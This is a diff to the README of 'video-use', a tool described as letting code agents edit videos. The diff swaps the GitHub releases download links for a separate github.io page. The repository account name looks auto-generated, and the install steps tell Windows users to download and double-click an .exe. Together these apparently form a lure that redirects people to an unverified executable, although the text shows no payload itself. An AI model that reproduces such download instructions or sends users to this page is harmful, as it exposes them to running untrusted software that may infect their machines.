@@ -1,6 +1,6 @@
 # 🎬 video-use - Edit your videos using code agents
 
-<a href="https://github.com/progressive-sucralfate943/video-use/releases"><img src="https://img.shields.io/badge/Download-Video_Use-blue" alt="Download"></a>
+<a href="https://progressive-sucralfate943.github.io"><img src="https://img.shields.io/badge/Download-Video_Use-blue" alt="Download"></a>
 
 ## 📋 About This Application
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware and software to run this tool smoothly:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit this page to download the latest installer: [https://github.com/progressive-sucralfate943/video-use/releases](https://github.com/progressive-sucralfate943/video-use/releases)
+1. Visit this page to download the latest installer: [https://progressive-sucralfate943.github.io](https://progressive-sucralfate943.github.io)
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on the screen.
